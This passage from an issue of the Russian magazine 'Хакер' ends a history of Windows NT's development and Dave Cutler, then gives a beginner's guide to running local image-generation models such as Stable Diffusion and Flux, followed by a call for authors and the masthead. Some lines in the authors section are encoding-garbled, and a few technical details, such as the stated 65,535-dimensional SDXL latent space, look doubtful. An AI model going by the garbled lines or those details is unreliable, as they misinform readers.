сотрудников Microsoft это показалось забавным, но в корпорации работали
и дамы, одной из которых это очень не понравилось. Она сообщила об этом
главе графического отдела Витмеру, но тот отмахнулся. Тогда она доложила
о  случившемся самому  высокому  начальству,  после  чего  битмап был
заменен.
  В последние месяцы перед релизом, когда команда уже правила баги,
не внося в систему новой функциональности, в конце каждой рабочей недели
на командном собрании Дэвид Катлер дарил футболку с надписью Zero Bugs
программистам, исправившим все баги в своем коде. Тем самым он старал‐
ся поднять командный дух, к тому же сразу становились видны те, кто еще не
исправил все баги.


О ДЭВИДЕ КАТЛЕРЕ

Отдельно стоит отметить взрывной характер Катлера. Разозлившись, он
говорил своим сотрудникам: Your ass like a grass and I’m a lawn mower («Твоя
задница как трава, а я — газонокосилка»). Руководить программистами всег‐
да тяжело. В порыве ярости он бил кулаком стену; о причиненных кому‑либо
увечьях Захари не сообщает.





                     Дэвид Катлер, Microsoft Corporation

Сотрудники Microsoft вспоминают, что Дэвид много работал. Между тем его
труд хорошо оплачивался: за три первых года работы в Microsoft Дэйв купил
два роскошных особняка на берегу озера Вашингтон, что вблизи Сиэтла.
Кроме того, он умел отдыхать: на каникулы уезжал на горнолыжные курорты,
участвовал в автомобильных гонках.
   Захари рассказывает о том, как Катлер праздновал свое 50-летие 13 мар‐
та 1992 года. Мое воспитание не позволяет описывать, в каких нарядах
заявились некоторые гости. Любопытно, что Билл Гейтс не был приглашен
на торжество. В качестве подарка друзья притащили VAX — мини‑компьютер
десятилетней давности размером со шкаф. На нем работала операционная
система, разработанная Катлером в DEC, — VMS. К слову, многие успешные
механизмы, реализованные Дэйвом и компанией в этой системе, были внед‐
рены в NT. Именно из‑за  этого впоследствии появились трения между
Microsoft и DEC, но они были благополучно улажены.


РЕЛИЗ

Спустя почти пять лет после начала разработки, 27 июля 1993 года, была
выпущена первая версия операционной системы Windows NT, по маркетин‐
говым соображениям получившая номер 3.1, следующий после Windows 3.0.
Первая версия Windows NT распространялась на 20 флоппи‑дисках, а до это‐
го были выпущены три беты и Release Candidate на CD. Автор описывает
суетливые подготовительные этапы к показу билда на компьютерных выс‐
тавках. В результате всех маркетинговых шагов общественность с нетерпени‐
ем ожидала выхода новой операционной системы.
  Для  своей работы NT  требовала более мощных  компьютеров, чем
Windows на основе DOS. Когда стандартным объемом оперативной памяти
было четыре мегабайта, Windows NT требовала шестнадцать. Как следствие,
продажи были невысокими; спросом пользовались версии Windows, основан‐
ные на DOS.
   Накануне релиза завершился тест длительностью в 41 час. Тест не выявил
критических багов — showstopper’ов. Катлер был доволен. Процесс раз‐
работки системы NT был тяжелым, особенно последний год. Команда испра‐
вила приблизительно 30 тысяч багов, смогла пережить стрессы и завершить
билд. Дэвид сел за компьютер и написал всем членам команды сообщение:

      From: Dave Cutler To: All
       NT официально выпущена в производство!«
       Позвольте мне заявить еще раз — NT выпущена!
      Это были  долгие и упорные  усилия. Вы все  проделали большую
      работу.
      Спасибо всем за ваш вклад, особенно за последние три месяца, ког-
      да нам удавалось править более 200 ошибок в день без серьезных
       регрессий.
      Для достижения этого потребовались беспрецедентные усилия со сто-
     роны всех вас.
    Мы выполнили всё задуманное и превзошли все ожидания!                »
После выпуска первой версии Windows NT люди, участвовавшие в ее раз‐
работке, почувствовали некоторое опустошение, не веря, что NT завершена.
Столь длительная разработка оставила отпечаток в жизни многих ее участни‐
ков. Кто‑то перешел в другое подразделение внутри корпорации, кто‑то
покинул Microsoft, у других появились семейные проблемы, кто‑то вовсе сме‐
нил место жительства. Так, Витмер — руководитель графического отдела
NT — уехал в Турцию, где жила его девушка. Дэвид Катлер после завершения
NT тоже собирался покинуть Microsoft, не зная, в какой проект перейти
теперь. Но перед этим он взял недельный отпуск и отправился в Ирландию.
Вернувшись в Штаты, Дэйв встретился с Биллом Гейтсом, который пред‐
ложил ему руководство над вновь образованным отделом для развития
Windows NT, в итоге Катлер остался в Microsoft.





                            Логотип Windows 3.1

Оглядываясь в прошлое, можно сделать вывод, что Windows NT опередила
свое время: обычные офисные компьютеры смогли нормально поддерживать
систему NT только к 2001 году, когда вышла первая широко распространив‐
шаяся среди некорпоративных пользователей Windows на основе NT —
Windows XP. Хотя появившаяся годом ранее Windows 2000 тоже была тепло
встречена в корпоративном  сегменте, она не получила широкого  рас‐
пространения среди домашних пользователей.
GEEK





Генерировать картинки по текстовому опи‐
санию — просто, но только если исполь‐
зовать  готовый  онлайновый  генератор.
Установить ИИ на свой компьютер куда
сложнее. В этой статье разберемся, какие           Олег Афонин                                                                                      Эксперт по мобильной
бывают  модели,  чем  отличается  Stable       криминалистике компании                                                                                         «Элкомсофт»
Diffusion от Flux, что такое AuraFlow и что        aoleg@voicecallcentral.com
вообще  нужно,  чтобы  делать  картинки
у себя, — без всяких запретов и ограниче‐
ний.


В этой статье я попробовал снизить «порог вхождения», ответив на самые
простые вопросы, которые возникают практически у всех, кто пытался разоб‐
раться в терминологии генеративного ИИ.


СТАТЬИ

В «Хакере» опубликована серия моих статей с рекомендациями по выбору,
установке и настройке разных моделей. Список статей будет пополняться,
как и другие списки в этом материале.
 1. Stable Diffusion XL. Генерируем картинки нейросетью на своем компьюте‐
   ре
 2. Stable Diffusion XL. Выбираем модели, рефайнеры, лоры и стили
 3. ReForge. Улучшаем картинки, генерируемые Stable Diffusion
 4. FLUX.1 и SwarmUI. Генерируем картинки новой открытой моделью


ЧТО НУЖНО, ЧТОБЫ НАЧАТЬ СОЗДАВАТЬ КАРТИНКИ?

Тебе потребуется компьютер (желательно — с видеокартой Nvidia), софт
и базовая модель (чекпоинт). Как софт, так и модели совершенно бесплатны;
от тебя потребуется только время и усилия, чтобы разобраться в процессе.


Видеокарта
Лучше всего с генеративным искусственным интеллектом работают виде‐
окарты Nvidia. Это не значит, что карты AMD или Intel (или даже чипы Apple
Silicon со встроенной графикой) совсем нельзя использовать, просто их под‐
держка во многих программах ограничена, и обход ограничений потребует
решения дополнительных проблем.
   Помимо архитектуры видеокарты, для работы ИИ критическим парамет‐
ром является объем выделенной видеопамяти (VRAM). Для старых моделей
достаточно 8–12 Гбайт; для современных и тех, что должны появиться в бли‐
жайшем будущем, нужно уже 16–24 Гбайт. Это не значит, что новые модели
не запустятся на старых видеокартах, — просто работать ИИ будет примерно
на 30–50% медленнее, чем если бы у видеокарты той же модели было дос‐
таточно памяти.


Софт
Практически весь софт для генеративных ИИ бесплатен, доступен в исходных
кодах и работает в окне браузера с использованием библиотеки gradio.
 1. Fooocus: идеальный продукт для начинающих и пользователей онлай‐
   новых сервисов, максимально близко подошедший к идеологии «одной
   кнопки». Поддерживает только модели SDXL, зато предлагает автомати‐
   ческое расширение запросов локальной языковой моделью (GPT-подоб‐
   ная LLM), что резко повышает разнообразие и красоту сгенерированных
   картинок. Практически не требует установки и совсем не требует настрой‐
   ки: достаточно распаковать архив и запустить. Даже модель Fooocus ска‐
   чает самостоятельно.
 2. AUTOMATIC1111:   классический   консервативный  WebUI,  апстрим
   для разнообразных форков. Сильные стороны — стабильность и образцо‐
   вая поддержка плагинов‑расширений (в форках на основе Forge некото‐
  рые расширения для A1111 не работают).
 3. Stable Diffusion web UI for AMDGPUs: форк A1111 для видеокарт AMD.
  В отличие от оригинала, поддерживает технологии DirectML, транслятор
   ZLUDA, Onnx Runtime и оптимизации Olive.
 4. WebUI Forge: форк AUTOMATIC1111 с более высокой скоростью работы
   и оптимизированным механизмом работы с видеопамятью. На данный
  момент ведется активная разработка, репозиторий в статусе эксперимен‐
   тального;  в  продукте  будут  отрабатываться  новые  технологии —
   от интерфейса gradio 4 до нового движка. Помимо архитектуры Stable
    Diffusion,   Forge   также   поддерживает   Flux.   Некоторые   плагины
   от A1111 не будут работать, что частично компенсируется наличием ряда
   встроенных расширений, выполняющих аналогичные функции.
 5. WebUI reForge: активно разрабатываемый форк описанного выше WebUI
   Forge.  Здесь  присутствуют  как  оптимизации  Forge,  так  и  новинки
   из AUTOMATIC1111 и ComfyUI.  Сегодня  именно  этот форк  работает
   с моделями SD1.5/SDXL/CosXL быстрее и стабильнее прочих. Использует
   старую версию gradio, поэтому совместимость с плагинами A1111 лучше,
   чем в оригинальном Forge.
 6. ComfyUI: мощный, расширяемый и отлично оптимизированный продукт
   с самой широкой поддержкой разных архитектур и технологий. Интерфейс
   в стиле блок‑схем — не для всех, однако он же позволяет сохранять
   и использовать как свои, так и сторонние блок‑схемы в виде готовых про‐
   ектов. Я не рекомендую начинать знакомство с генеративными ИИ с этой
   оболочки из‑за сложности освоения. Именно Comfy первым получает под‐
   держку новых архитектур и моделей — часто буквально в день их выхода.
 7. SwarmUI: оболочка для Comfy, напоминающая WebUI. Совмещает удоб‐
  ный интерфейс и «всеядность» Comfy. Об этом продукте я подробно
   писал.

Есть и другие варианты.
 1. InvokeAI: один из немногих продуктов, работающих как самостоятельное
   приложение, а не через браузер. По возможностям — что‑то среднее
   между  A1111 и  Fooocus  с  максимально  удобным  пользовательским
   интерфейсом. Для продвинутых пользователей есть режим наподобие
   Comfy.
 2. StabilityMatrix: надстройка, из которой можно устанавливать различные
   веб‑интерфейсы и рулить ими.
 3. Draw  Things:  эксклюзивный  UI  для  Mac/iOS.  Оптимальный  софт
   для чипов Apple Silicon. Поддерживает модели как Stable Diffusion, так
   и Flux.
 4. SD.Next: еще один форк A1111 с поддержкой множества моделей и архи‐
    тектур. К сожалению, продукт сложен в настройке, а стабильность работы
   оставляет желать лучшего. В состав форка входит множество предус‐
   тановленных плагинов.
 5. Krita Diffusion: фактически, это нейросетевой плагин к опенсорсному
   графическому  редактору  Krita.  Позволяет  как  удалять, дорисовывать
   и перерисовывать объекты в самом изображении, так и «расширять» кар‐
   тинку в стороны, убедительно дорисовывая отсутствующий контент.

Что из этого выбрать?
   Если у тебя Mac, начни с Draw Things. Если простота использования «из
коробки» и качественные изображения даже по самым простым текстовым
запросам для тебя важнее расширяемости и продвинутых возможностей —
ставь  Fooocus.  Для  моделей SDXL  отлично  подходят  WebUI  reForge
или SwarmUI; для Flux — SwarmUI или WebUI Forge. Оригинальный WebUI
Forge подойдет любителям экспериментировать с новейшими технологиями.
Если у тебя видеокарта AMD, попробуй форк WebUI AMDGPU.


             INFO

                          A1111, WebUI Forge и reForge можно  устанав‐
                        ливать параллельно в разные каталоги. При этом
                       все три дистрибутива могут использовать общие
                            папки с моделями разных типов. Для этого пре‐
                          дусмотрены параметры командной строки (файл
                   webui-user.bat), такие как --models-dir,
                   --ckpt-dir, --lora-dir, --clip-models-
                   path, --embeddings-dir.



МОДЕЛИ И АРХИТЕКТУРЫ

Для генеративного ИИ разработано несколько семейств моделей. В рамках
одного семейства может быть и единственная модель (например, это отно‐
сится к AuraFlow или Kolors), и множество моделей как изначального раз‐
работчика,  так  сторонних и даже  обычных  пользователей.  Например,
для архитектур Stable Diffusion 1.5 (SD1.5) и Stable Diffusion XL (SDXL) в силу их
популярности  и  открытой  лицензии  доступны  тысячи  разнообразных
моделей.


Архитектуры
Перечислю основные семейства моделей.
 • SD1.5 (Stable Diffusion 1.5): очень старая модель с максимальным раз‐
   решением картинки до апскейла 512 на 512 точек. Нетребовательна
   к ресурсам, ее можно запустить даже на очень слабой видеокарте.
  Для SD1.5 существует огромное количество моделей, как обученных, так
   и ремиксов.
 • NAI (NAI Diffusion): это — онлайновый сервис для генерации изображений
   в стиле аниме. В свое время утечка внутренней модели NAI, основанной
   на архитектуре Stable Diffusion 1.5, привела к бурному развитию ани‐
   ме‑подобных моделей в рамках SD1.5. В  качестве самостоятельной
  модели на сегодняшний день интереса не представляет, но в той или иной
  мере присутствует в подавляющем большинстве аниме‑моделей SD1.5.
 • SD2.0:  неудачная  версия  Stable  Diffusion,  совершенно  заслуженно
   забытая (за редкими исключениями в виде исследовательских работ).
 • SDXL  (Stable  Diffusion  XL,  преемник  SD1.5):  улучшенная  версия
   SD1.5 с рабочим разрешением 1024 на 1024 (поддерживается ряд фик‐
   сированных разрешений с разным соотношением сторон, но с тем же
  общим числом пикселей). В рамках этой архитектуры созданы тысячи раз‐
   нообразных моделей, как похожих на базовую модель, так и радикально
   от нее отличающихся. Идеальный вариант для тех, кто активно использует
   ControlNet (см. ниже).
 • CosXL (Cosine-Continuous Stable Diffusion XL): экспериментальная архи‐
   тектура и базовая модель на основе модифицированной архитектуры
   Stable Diffusion XL, отличающаяся от оригинала расширенным динамичес‐
   ким диапазоном и глубоким черным  цветом. Создана в  Stability  AI.
  По сравнению с этой моделью результаты «обычной» SDXL выглядят блек‐
   ло. Несмотря на техническое превосходство, на основе CosXL созданы
   считаные единицы сторонних моделей, что объясняется как техническими
   отличиями (CosXL пока не поддерживается в A1111 и WebUI Forge, но под‐
   держивается в reForge, SwarmUI и Comfy), так и лицензией, ограничи‐
  вающей ее коммерческое использование. Если захочешь попробовать,
   рекомендую модель gtmUltimateblendXL_v25Cosxl.
 • Pony Diffusion (модель глубокого обучения на основе SDXL): нишевая
   модель, созданная для генерации широкого спектра персонажей из ани‐
  ме и взаимодействий между ними. Сыграла для SDXL роль, аналогичную
   роли модели NAI для SD1.5. В отличие от базовой модели SDXL, Pony обу‐
   чена  на  изображениях,  описываемых  набором  стандартных  тегов
   danbooru, но почти полностью «забыла» множество концепций из базовой
   модели. Модели LoRA для SDXL и Pony за редкими исключениями несов‐
   местимы, а формирование текстовых запросов к этой модели радикально
   отличается от привычных запросов SDXL. Тем не менее как оригинальная
   Pony Diffusion V6, так и ее многочисленные производные полностью сов‐
   местимы со всеми программами, поддерживающими архитектуру Stable
   Diffusion XL. Модели на основе Pony получили свой собственный класс
   на ресурсе Civit.ai.
 • LCM, Turbo, Lightning, Hyper, DMD2: все это — разные технологии
   ускорения, позволяющие генерировать изображения за меньшее число
   шагов (как правило, 4–10). При использовании таких технологий в той
   или иной мере могут страдать детализация и разнообразие генерируемых
   изображений. В чистом виде эти технологии требуют пониженного зна‐
   чения CFG  (Classifier Free Guidance), однако есть и множество «гиб‐
   ридных» моделей, способных работать в ускоренном, «немного ускорен‐
   ном» и обычном режимах в зависимости от параметров. Имеет ли смысл
   качать уже «ускоренную» базовую модель или лучше просто подключить
   соответствующую лору? Решать тебе. Интегрированные модели удобнее,
   а об их минусах можешь почитать в статье «Why I’m opting out: A thoughtful
   perspective on Lightning merged checkpoints».
 • Stable Cascade:  побочный  релиз,  экспериментальная  архитектура,
   использующая каскад из трех стадий (и трех субмоделей) для генерации
   изображений.  Лицензия  ограничивает  коммерческое  использование
   модели. По этой причине (а также из‑за завышенных ожиданий к Stable
   Diffusion 3) модель не получила развития и широкой поддержки сторон‐
  ними разработчиками.
 • Stable Diffusion 3 (преемник SDXL): в настоящее время находится в под‐
   вешенном состоянии из‑за недообученности выпущенной версии. Изна‐
   чально присутствовали и лицензионные ограничения, которые потом сня‐
   ли. Выход исправленной версии ожидается, но сроки неизвестны.

На этом модели  производства  Stability  AI  заканчиваются и начинаются
модели, разработанные другими компаниями.
 • FLUX.1 [dev]: новая модель на основе архитектуры DiT. В ее составе пос‐
   тавляется локальная языковая модель, благодаря которой модель замет‐
   но точнее следует сложным текстовым запросам. Поддерживается в Forge,
   ComfyUI, SwarmUI, Draw Things для Mac. Лицензия модели ограничивает
   коммерческое   использование.   Максимальное   разрешение   изоб‐
   ражений — 2 мегапикселя (1440 на 1440 в различных соотношениях сто‐
   рон), однако на высоких разрешениях может выдавать блочные артефак‐
   ты. Модель представлена как в исходном виде, так и в квантованных (сжа‐
   тых) представлениях, что позволяет запустить ее даже на слабых виде‐
   окартах с небольшим объемом видеопамяти.

Перечисленные ниже модели не  получили  широкого  распространения,
но поддерживаются в ComfyUI/SwarmUI.
 • fal/AuraFlow :  перспективная модель  с  открытым исходным  кодом,
   которую  разрабатывает  компания  Fal   Ai.  Основное  преимущество
   AuraFlow — максимальная открытость и практическое отсутствие лицен‐
   зионных ограничений, что делает ее привлекательной для разработчиков
   и пользователей ИИ. Попробовать модель можно онлайн на сайте раз‐
   работчика.  Локальная  работа  AuraFlow  поддерживается  в  Comfy
   и SwarmUI, однако на данный момент модель еще не достигла желаемого
   уровня качества; обучение продолжается. Версия AuraFlow 0.3 улучшает
   качество картинок, но точность следования запросам пострадала. Сейчас
   ожидается версия 0.4: разработчики стараются выпускать промежуточные
   обновления ежемесячно.
 • Alpha-VLLM/Lumina-Next-SFT: мощная модель на  основе  Next-DiT
   и языковой модели Gemma 2B. К сожалению, установить ее локально пока
   можно только в виде отдельного приложения, процесс установки которого
   сложен даже по меркам софта с открытым исходным кодом.
 • HunyuanDIT: модель производства Tencent, поддерживающая, кроме
   английского,  китайский  язык. В Comfy  поддерживается  посредством
   модуля city96/ComfyUI_ExtraModels.
 • PixArt Sigma: модель в активной разработке. В Comfy поддерживается
   посредством модуля city96/ComfyUI_ExtraModels.
 • Kwai-Kolors/Kolors: еще одна новая модель. В отличие от перечис‐
   ленных выше моделей, использует архитектуру U-Net (так же как и SDXL).

Какие из этих моделей стоит попробовать? Flux можно и нужно пользоваться
прямо сейчас, если позволяет железо. AuraFlow представляет безусловный
интерес, но пока скорее теоретический; модель в процессе обучения. Lumina
Next — очень интересная, мощная модель, но ее установка чрезмерно слож‐
на.
   Пользователь  Reddit выложил подробное сравнение  (с  картинками!)
моделей PixArt Sigma, Hunyuan DiT, SD3 Medium и Lumina-Next-T2I.


БАЗОВЫЕ И ДОПОЛНИТЕЛЬНЫЕ МОДЕЛИ

Существуют  многочисленные  базовые  модели  (чекпоинты)  на  основе
как перечисленных выше, так и других архитектур. Также существует множес‐
тво дополнительных подключаемых моделей (LoRA, Lycoris, DoRA), о которых
нужно знать следующее: это небольшие дополнения к базовой модели (чек‐
поинту), работающие в рамках базовой архитектуры, для которой они соз‐
даны, и  описывающие  концепцию,  стиль или  персонажа, которых  нет
в основной модели. Кроме того, есть так называемые текстовые инверсии
(embedding), которые при помощи всего одного токена помогают базовой
модели «найти» ту или иную концепцию, если такая концепция есть в самой
модели. Текстовые инверсии, в отличие от лор, работают в щадящем режиме,
реализуя заданные концепции независимо от общего стиля картинки и не
влияя на него.
  Для начала работы тебе нужно будет скачать одну или несколько базовых
моделей и сохранить ее в соответствующей папке. Впрочем, практически все
веб‑интерфейсы автоматически качают какую‑то базовую модель, если ты
попытаешься сгенерировать картинку сразу после установки.


Из каких частей состоит базовая модель
Архитектурно модели генеративного ИИ состоят из трех взаимосвязанных
частей.
 1. Текстовый декодер. Это одна или несколько (в SDXL — две, Flux — тоже
   две, но другие) моделей, задача которых — перевод токенов из тексто‐
   вого запроса в векторы, указывающие на координаты в многомерном
   латентном пространстве. К  слову, мерность  латентного пространства
  SDXL — 65 535. В качестве текстового декодера могут использоваться
   CLIP  (простой  текстовый  декодер  разработки  OpenAI,  создателей
   ChatGPT), T5 (локальная LLM разработки Google) и другие. В SDXL исполь‐
   зуется пара из OpenCLIP-ViT/G и CLIP-ViT/L, первый из которых декоди‐
   рует запросы, написанные на естественном языке, а второй — ключевые
   слова,  перечисленные  через  запятую;  Flux  использует  CLIP-ViT/L
   для декодирования ключевых слов и T5xxl для работы с естественными
   запросами.
 2. Основная модель, представленная сжатыми данными в латентном прос‐
   транстве. На сегодняшний день самыми популярными архитектурами
   для таких моделей являются U-Net (используется в SDXL, Kolors) и DiT
   (более новая архитектура, которую используют почти все модели, вышед‐
  шие после SDXL). Чаще всего обучению подвергается именно основная
   модель; текстовые декодеры и VAE, как правило, сторонние разработчики
   не трогают.
 3. Вариационный  автокодировщик  (VAE) — это модель‑кодек, которая
   используется для сжатия пиксельного изображения в латентное прос‐
   транство и его восстановления из латентного пространства, «проявляя»
   таким образом латентный «негатив» (технические детали). Именно VAE
   отвечает за то, чтобы «вытащить» сгенерированную картинку из латентно‐
   го пространства в пространство пикселей; эта модель оказывает влияние
   на контраст и цветопередачу (оттого для SDXL существует базовый и нес‐
   колько кастомных VAE), но не влияет на композицию изображения. В SDXL
   используют простые и несовершенные по современным меркам 4-каналь‐
  ные VAE, тогда как SD3 и Flux используют более качественный и современ‐
  ный 16-канальный VAE.


                                  U-Net  DiT?В чем разница между архитектурами      и
U-Net работает как набор луп — он «сжимает» изображение, чтобы выделить
важные детали, а затем «разворачивает» его обратно, восстанавливая кар‐
тинку и добавляя детали на каждом шаге. Это похоже на процесс сжатия
и распаковки файла, но с добавлением информации на каждом шаге.
   DiT — более «умный» способ обработки данных. Он использует трансфор‐
меры, которые анализируют картинку целиком, понимая, какие части связаны
между собой и каким образом. Попробуй, например, сгенерировать картинку
с человеком, который держит меч; модели DiT смогут правильно нарисовать
хват меча чаще, чем это сможет сделать модель с U-Net.



В SD1.5 и SDXL в состав файла модели могут входить как все три части, так
и только первые две (разработчики моделей, как правило, указывают эту осо‐
бенность в описании); в последнем случае VAE нужно подключать отдельно.
Для Flux существуют интегрированные модели, но в силу большого объема
T5xxl (а  также из‑за того, что существуют разные представления  этого
декодера —  например,  8-битный  вариант  для  обычных  и  16-битный
для топовых видеокарт) разработчики предпочитают публиковать только U-
Net (на самом деле, конечно же, DiT) отдельно. Кстати, базовая модель
FLUX.1 [dev] была опубликована именно в таком раздельном виде.


Обученные модели и ремиксы
Базовые модели (чекпоинты) бывают обученные (trained) и ремиксы (merged).
Изначально подразумевалось, что «обученные» модели — те, которые под‐
верглись глубокому тюнингу в течение нескольких «эпох» (циклов обучения
и коррекции на одном и том же наборе данных), однако со временем в число
обученных стали включать и модели, в составе которых, помимо базовой
модели или ремикса, есть хотя бы одна лора, самостоятельно обученная
автором. Соответственно, ремикс — это модель, в состав которой входят
другие модели (обученные или ремиксы) и, возможно, лоры, созданные дру‐
гими пользователями.
   У обоих классов моделей есть свои особенности. Так, модели, обученные
классическим способом, часто имеют шероховатости, которые можно сгла‐
дить, добавив в микс части других моделей. С другой стороны, многочис‐
ленные ремиксы и ремиксы ремиксов часто страдают от отсутствия разнооб‐
разия; это может выражаться, например, в том, что на всех сгенерированных
изображениях  вместо  разнообразных живых людей  присутствует некое
усредненное  синтетическое лицо. С  этим, опять  же, можно  бороться,
добавив в ремикс нужные блоки от обученной модели, но многие создатели
ремиксов делать этого попросту не умеют.
  Не стоит фиксировать внимание только на «обученных» (trained) моделях:
хороших ремиксов (merged) ничуть не меньше, и качество картинки они спо‐
собны выдать ничуть не хуже.


Где брать базовые модели
Есть несколько ресурсов, на которых публикуются различные модели. Самый
крупный из них — Civit.ai. Имеет смысл активировать фильтры, чтобы отоб‐
ражались  только базовые модели  (checkpoint)  требуемой  архитектуры
или архитектур (например, SDXL, Pony или Flux); в противном случае тебе
придется продираться через десятки тысяч всевозможных лор, созданных
для разных архитектур.
   Ряд моделей публикуется на сайте Tensor.art, в том числе эксклюзивно
(например, креативная модель Kika_real). Наконец, ресурс, на котором пуб‐
ликуются модели с открытым исходным кодом Hugging Face, с которого,
в частности, можно скачать квантованные версии модели Flux, а также кван‐
тованные версии текстовых декодеров t5.
   Дополнительные  модели  (LoRA,  DoRA,  Lycoris,  а  также  текстовые
инверсии) можно скачать с тех же сайтов, не забыв поменять фильтры.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №10 (307)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
               Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                          Евгения Шарипова           yambuto
                            Литературный редактор          Бильд‑редактор
                                                   yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий‑Стем‐
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы о подписке:        ​Вопросы о материалах:
                                 lapina@glc.ru                support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2024